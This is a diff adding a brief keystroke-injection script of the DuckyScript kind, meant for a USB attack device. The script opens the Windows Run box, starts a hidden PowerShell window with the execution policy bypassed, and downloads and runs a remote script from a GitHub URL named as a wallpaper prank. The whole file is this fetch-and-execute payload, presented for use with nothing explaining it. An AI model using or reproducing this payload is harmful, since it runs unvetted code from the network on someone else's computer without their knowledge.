@@ -1,0 +1,6 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/franu5/payload-wallpaper/blob/main/Wallpaper-Troll.ps1?dl=1; invoke-expression $pl
+DELAY 500
+ENTER
+
